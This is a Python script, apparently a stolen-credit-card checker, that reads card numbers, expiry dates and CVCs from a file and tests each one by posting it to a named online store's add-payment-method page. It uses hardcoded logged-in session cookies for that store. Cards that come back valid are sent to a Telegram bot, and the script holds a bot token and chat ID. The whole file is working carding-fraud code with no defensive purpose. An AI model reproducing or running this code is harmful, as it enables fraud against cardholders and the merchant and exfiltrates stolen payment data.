import requests
import pyfiglet

file=open('cc.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

logo = pyfiglet.figlet_format('            AyAN ')
print(Z+logo)
log = pyfiglet.figlet_format(' V 2 . 0 ')
print(F+log)
k=("___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕")
print(X+k)
print(B+k)

k=("___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕___♕")

token=input('ENTER TOKEN :7638618978:AAHZVGSG_jFLEr8VmBUSKUS106NAHogE1Go')
ID=input('ENTER ID :7092074614')
print(C+k)
for P in file.readlines():
	start_num = 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	try:
		data = requests.get('https://lookup.binlist.net/'+P[:6]).json()
	except:
		pass
	try:
		bank=(data['bank']['name'])
	except:
		bank=('unknown ♡')
	try:
		emj=(data['country']['emoji'])
	except:
		emj=('unknown ♕')
	try:
		cn=(data['country']['name'])
	except:
		cn=('unknown ♡')
	try:
		dicr=(data['scheme'])
	except:
		dicr=('unknown ♕')
	try:
		typ=(data['type'])
	except:
		typ=('unknown ♡')
	try:
		url=(data['bank']['url'])
	except:
		url=('unknown♕')
	cookies = {
    '_fbp': 'fb.1.1747162897169.400769398633021010',
    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': 'support%7C1748599011%7CzCLryRAnO1IDvdkXzSm01k9IIfkjAm49uZnPRpoBlSe%7C37ebdbec89bd5a71623559ca2f2fe28eaa99f8417aa6ea5ca2523eec3abd624a',
    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'b23pzno2e2s7qv0uo3md',
    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '85069%7Cother%7Cread%7Cd5cd40d794e2ae985f6468380423770e5b04f41404249917fb00815d88dd3d64',
    '__cf_bm': 'XPdit7FhHqL4c8HZqI2j8CnqHZOkPFOIAaTd.UjI2sg-1747408160-1.0.1.1-EAyczoyO0knHddenhm23hycBCU2vatWFpJQlES9MqB4tSzDFrENT123H3UHMedt_IGyVFAZ57U1_FPyOwLXLTFrVOUIVVDUVUfd3sVqeLjg',
    'wp_automatewoo_session_started': '1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-05-16%2015%3A09%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_first_add': 'fd%3D2025-05-16%2015%3A09%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
    '__kla_id': 'eyJjaWQiOiJZak0zTW1WaE56Z3ROMlZsWmkwME1qazFMVGt3TXpFdFltRTRNMkl4WkRBd01UWmgiLCIkZXhjaGFuZ2VfaWQiOiI1cm9aRk11OUwtbDk0Vm1KT3M5OXdEY01oSTlBSHdwUV9ia3dGSFFmczVJLkpCemFKSiJ9',
}

	headers = {
    'authority': 'alphawolfnutrition.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': '_fbp=fb.1.1747162897169.400769398633021010; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=support%7C1748599011%7CzCLryRAnO1IDvdkXzSm01k9IIfkjAm49uZnPRpoBlSe%7C37ebdbec89bd5a71623559ca2f2fe28eaa99f8417aa6ea5ca2523eec3abd624a; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=b23pzno2e2s7qv0uo3md; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=85069%7Cother%7Cread%7Cd5cd40d794e2ae985f6468380423770e5b04f41404249917fb00815d88dd3d64; __cf_bm=XPdit7FhHqL4c8HZqI2j8CnqHZOkPFOIAaTd.UjI2sg-1747408160-1.0.1.1-EAyczoyO0knHddenhm23hycBCU2vatWFpJQlES9MqB4tSzDFrENT123H3UHMedt_IGyVFAZ57U1_FPyOwLXLTFrVOUIVVDUVUfd3sVqeLjg; wp_automatewoo_session_started=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-16%2015%3A09%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-05-16%2015%3A09%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F; __kla_id=eyJjaWQiOiJZak0zTW1WaE56Z3ROMlZsWmkwME1qazFMVGt3TXpFdFltRTRNMkl4WkRBd01UWmgiLCIkZXhjaGFuZ2VfaWQiOiI1cm9aRk11OUwtbDk0Vm1KT3M5OXdEY01oSTlBSHdwUV9ia3dGSFFmczVJLkpCemFKSiJ9',
    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}

	data = {
    'ajax': '1',
    'do': 'check',
    'cclist': {P},
}

	response = requests.post('https://alphawolfnutrition.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	if "Live" in response.text:
			print(F+f'''◆ CC© ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝐀𝐘â𝐍_𝐊𝐢𝐍𝐠→➳♥
~~~♕~~~♕~~~♕~~~♕
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} ''')
			print(Z+k)
			mgs=f'''◆ CC©  ➜ {P} 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝐀𝐘â𝐍_𝐊𝐢𝐍𝐠→➳♥
~~~♕~~~♕~~~♕~~~♕
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} 
~~~♕~~~♕~~~♕~~~♕
◆ 𝑩𝒀: @SS_PROO
◆𝑷𝑹𝑶𝑿𝒀𝑺: 𝑷𝑹𝑶𝑿𝒀 𝑳𝑰𝑽𝑬 ✅ '''
			tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
			i = requests.post(tlg)
	else:
			print(Z+f'''◆ CC©  ➜ {P} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 
Declind❌
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 
Declind
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑨𝑳𝑻𝑬𝑵𝑬𝑵 𝑺𝑬𝑹𝑽𝑬𝑹
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {P[:6]} - {dicr} - {typ} 
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {cn} - {emj} 
◆ 𝑩𝑨𝑵𝑲 ➜ {bank}
◆ 𝑼𝑹𝑳 ➜ {url} ''')
			print(Z+k)